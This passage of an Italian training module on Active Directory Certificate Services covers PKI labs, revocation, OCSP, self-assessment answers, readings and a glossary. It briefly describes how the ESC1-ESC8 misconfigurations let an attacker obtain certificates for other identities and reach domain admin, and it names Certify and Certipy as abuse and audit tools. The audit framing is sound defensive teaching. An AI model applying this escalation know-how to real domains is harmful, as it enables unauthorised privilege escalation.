2. Documentare la Issuing CA online: nome, validità (10 anni), integrazione AD, AIA e CDP locations.
3. Definire almeno 4 certificate templates personalizzati: Web Server, Workstation Auth, User S/MIME, Code Signing.
4. Per ogni template specificare: key usage, EKU, validità, dimensione chiave, permessi di enrollment.
5. Disegnare il diagramma di flusso dell'enrollment (manuale, auto-enrollment, web enrollment).

**Criteri di validazione**: la gerarchia deve rispettare il principio di separazione dei ruoli; la Root CA non deve essere connessa alla rete.

### Esercizio 2: Installazione e Configurazione AD CS

In un ambiente di lab, installare una PKI a due livelli:

1. Installare la Root CA su un server standalone (non domain-joined) con `Install-AdcsCertificationAuthority`.
2. Generare il certificato della Root CA e pubblicare il CRL su un punto HTTP accessibile.
3. Installare la Issuing CA su un server domain-joined, subordinata alla Root CA.
4. Configurare auto-enrollment per certificati computer via GPO.
5. Verificare il funzionamento con `certutil -verify` e `Test-Certificate`.

**Criteri di validazione**: `certutil -TCAInfo` deve mostrare la Issuing CA attiva. Un computer di dominio deve ottenere automaticamente un certificato dopo `gpupdate /force`.

### Esercizio 3: Revoca e OCSP

Configurare la revoca dei certificati:

1. Revocare un certificato di test con `certutil -revoke <serial>` specificando il motivo.
2. Pubblicare un delta CRL con `certutil -CRL`.
3. Installare e configurare Online Responder (OCSP) sulla Issuing CA.
4. Verificare lo stato di revoca con `certutil -verify -urlfetch <cert.cer>`.
5. Testare che un client rifiuti un certificato revocato.

**Criteri di validazione**: `certutil -verify` deve mostrare "REVOKED" per il certificato revocato. L'OCSP responder deve rispondere con "Good" o "Revoked" correttamente.

### Esercizio 4: Audit di Sicurezza PKI

Eseguire un audit di sicurezza della PKI di lab:

1. Eseguire `certutil -template -v` e analizzare i permessi di ogni template.
2. Identificare template con "Authenticated Users" o "Everyone" con permesso Enroll su template sensibili.
3. Usare Certify o PSPKIAudit per identificare vulnerabilità ESC1-ESC8.
4. Documentare ogni finding con: descrizione, rischio (CVSS), template coinvolto, remediation.
5. Implementare le remediation e verificare con un secondo scan.

**Criteri di validazione**: nessun template sensibile deve avere enrollment aperto. Il report deve indicare zero vulnerabilità ESC* critiche dopo la remediation.

---

## Auto-valutazione

### Domanda 1

Perché la Root CA deve essere offline e quali sono le implicazioni operative?

<details>
<summary>Risposta</summary>

La Root CA offline protegge la chiave privata della root da compromissione. Se la chiave root viene compromessa, l'intera PKI è invalidata e tutti i certificati devono essere riemessi. Implicazioni operative: la Root CA viene accesa solo per firmare certificati di CA subordinate e pubblicare CRL (tipicamente ogni 6-12 mesi). La CRL della Root deve avere validità lunga (1 anno+) con overlap period. Il rinnovo del certificato della Issuing CA richiede accesso fisico alla Root CA.

Riferimento: Microsoft Learn, Securing PKI: Planning a CA Hierarchy. Consultato: 2026-05-23.
</details>

### Domanda 2

Qual è la differenza tra CRL e OCSP? Quando preferire l'uno all'altro?

<details>
<summary>Risposta</summary>

CRL (Certificate Revocation List) è una lista completa dei certificati revocati, scaricata periodicamente dal client. OCSP (Online Certificate Status Protocol) risponde in tempo reale sullo stato di un singolo certificato. CRL ha latenza (tra una pubblicazione e l'altra un certificato revocato potrebbe risultare valido). OCSP è real-time ma richiede un server sempre disponibile. Delta CRL riduce la dimensione della CRL ma non elimina la latenza. Usare OCSP per certificati ad alto valore (web server, autenticazione), CRL per scenari offline o a bassa criticità.

Riferimento: RFC 6960, Online Certificate Status Protocol. Consultato: 2026-05-23.
</details>

### Domanda 3

Cosa sono le vulnerabilità ESC (AD CS) e perché sono critiche?

<details>
<summary>Risposta</summary>

Le vulnerabilità ESC (ESCalation) sono misconfigurazioni di AD CS che permettono a un attaccante di ottenere certificati per identità diverse dalla propria (privilege escalation). ESC1: template con flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT che permette di specificare un SAN arbitrario. ESC2: template con Any Purpose EKU. ESC3: enrollment agent senza restrizioni. ESC4: permessi di modifica template troppo ampi. ESC8: NTLM relay verso il web enrollment HTTP. Sono critiche perché consentono domain admin escalation. Tool di audit: Certify, PSPKIAudit.

Riferimento: SpecterOps, Certified Pre-Owned (2021). Consultato: 2026-05-23.
</details>

### Domanda 4

Come funziona l'auto-enrollment via GPO?

<details>
<summary>Risposta</summary>

L'auto-enrollment è configurato in due punti: (1) GPO: Computer/User Configuration → Policies → Windows Settings → Security Settings → Public Key Policies → Certificate Services Client - Auto-Enrollment (Enable, "Renew expired certificates" e "Update certificates that use templates" abilitati). (2) Template: il gruppo (utenti o computer) deve avere i permessi "Read", "Enroll" e "Autoenroll" sul template. Quando entrambe le condizioni sono soddisfatte, il client richiede automaticamente il certificato durante gpupdate o al logon.

Riferimento: Microsoft Learn, Certificate Autoenrollment. Consultato: 2026-05-23.
</details>

### Domanda 5

Cos'è il Key Archival e quando è obbligatorio?

<details>
<summary>Risposta</summary>

Il Key Archival permette alla CA di archiviare una copia della chiave privata del certificato nel database CA, cifrata con il certificato del KRA (Key Recovery Agent). È obbligatorio per certificati di cifratura (S/MIME, EFS) perché la perdita della chiave privata rende i dati cifrati irrecuperabili. Non deve essere abilitato per certificati di firma (digital signature) perché il non-repudiation richiede che solo il titolare possieda la chiave privata. Configurazione: abilitare "Archive subject's encryption private key" nel template e designare un KRA nella CA.

Riferimento: Microsoft Learn, Key Archival and Recovery. Consultato: 2026-05-23.
</details>

---

## Letture Primarie Consigliate

1. **Microsoft Learn: AD CS Documentation** — Guida completa ai servizi certificati Active Directory.
   https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/
   Consultato: 2026-05-23.

2. **Microsoft Learn: PKI Design Guide** — Pianificazione della gerarchia CA, template, enrollment.
   https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/pki-design-guide
   Consultato: 2026-05-23.

3. **SpecterOps: Certified Pre-Owned** — Whitepaper sulle vulnerabilità AD CS (ESC1-ESC8) e tecniche di exploitation.
   https://posts.specterops.io/certified-pre-owned-d95910965cd2
   Consultato: 2026-05-23.

4. **Microsoft Learn: OCSP Configuration** — Installazione e configurazione Online Responder per AD CS.
   https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/configure-ocsp
   Consultato: 2026-05-23.

5. **PSPKIAudit (GitHub)** — Tool PowerShell per l'audit automatizzato delle configurazioni AD CS.
   https://github.com/GhostPack/PSPKIAudit
   Consultato: 2026-05-23.

---

## Collegamenti Incrociati

| File | Relazione con questo modulo |
|---|---|
| [01-active-directory.md](01-active-directory.md) | Prerequisito: struttura AD, GPO, gruppi necessari per enrollment e permessi template |
| [05-sicurezza-windows.md](05-sicurezza-windows.md) | Approfondimento: hardening della PKI, audit certificati, Tiered Administration |
| [06-rete-windows.md](06-rete-windows.md) | Contesto: certificati per 802.1X (NPS/RADIUS), VPN, e autenticazione di rete |
| [08-permessi-e-accesso.md](08-permessi-e-accesso.md) | Contesto: ACL sui template, permessi Enroll/Autoenroll, DACL della CA |
| [24-windows-defender-endpoint-security.md](24-windows-defender-endpoint-security.md) | Integrazione: certificati per code signing, WDAC, e verifica integrità |

---

## Glossario Locale

| Termine | Definizione |
|---|---|
| **AIA** | Authority Information Access. Estensione del certificato che indica dove scaricare il certificato della CA emittente. |
| **CDP** | CRL Distribution Point. URL da cui i client scaricano la lista di revoca dei certificati. |
| **CRL** | Certificate Revocation List. Lista firmata dalla CA contenente i numeri seriali dei certificati revocati. |
| **EKU** | Extended Key Usage. OID nel certificato che specifica gli usi consentiti (Server Auth, Client Auth, Code Signing, ecc.). |
| **ESC** | Escalation. Classe di vulnerabilità AD CS (ESC1-ESC13+) che permettono privilege escalation tramite misconfigurazioni di template, ACL, relay e protocolli. |
| **HSM** | Hardware Security Module. Dispositivo hardware dedicato alla protezione delle chiavi crittografiche. |
| **KRA** | Key Recovery Agent. Utente autorizzato a recuperare chiavi private archiviate nel database della CA. |
| **NDES** | Network Device Enrollment Service. Servizio che implementa SCEP per l'enrollment di dispositivi di rete. |
| **OCSP** | Online Certificate Status Protocol. Protocollo per la verifica in tempo reale dello stato di revoca di un certificato. |
| **SAN** | Subject Alternative Name. Estensione del certificato che elenca nomi aggiuntivi (DNS, IP, email). |
| **ACME** | Automatic Certificate Management Environment (RFC 8555). Protocollo per automazione emissione e rinnovo certificati, supportato nativamente da AD CS in Windows Server 2025. |
| **AIK** | Attestation Identity Key. Chiave generata dal TPM usata per attestare che altre chiavi risiedono nel modulo hardware. |
| **CBA** | Certificate-Based Authentication. Autenticazione passwordless basata su certificati X.509 in Microsoft Entra ID. |
| **Certipy** | Strumento Python open-source (v5+) per enumerazione, audit e sfruttamento di vulnerabilità AD CS (ESC1-ESC13). |
| **Certify** | Strumento C# (GhostPack) per enumerazione e abuso di misconfigurazioni AD CS. |
| **EK** | Endorsement Key. Chiave asimmetrica univoca fusa nel TPM dal produttore, usata come radice di fiducia hardware. |
| **ML-DSA** | Module-Lattice-Based Digital Signature Algorithm (FIPS 204). Standard NIST post-quantum per firme digitali, successore di CRYSTALS-Dilithium. |
| **ML-KEM** | Module-Lattice-Based Key Encapsulation Mechanism (FIPS 203). Standard NIST post-quantum per scambio chiavi, successore di CRYSTALS-Kyber. |
| **PQC** | Post-Quantum Cryptography. Famiglia di algoritmi crittografici resistenti ad attacchi da computer quantistici. |
| **PSPKIAudit** | Modulo PowerShell per audit automatizzato della configurazione AD CS e rilevamento vulnerabilità ESC*. |
| **SLH-DSA** | Stateless Hash-Based Digital Signature Algorithm (FIPS 205). Standard NIST post-quantum basato su hash, backup senza reticoli. |
| **TPM** | Trusted Platform Module. Chip hardware (versione 2.0) per generazione, custodia e attestazione sicura di chiavi crittografiche. |
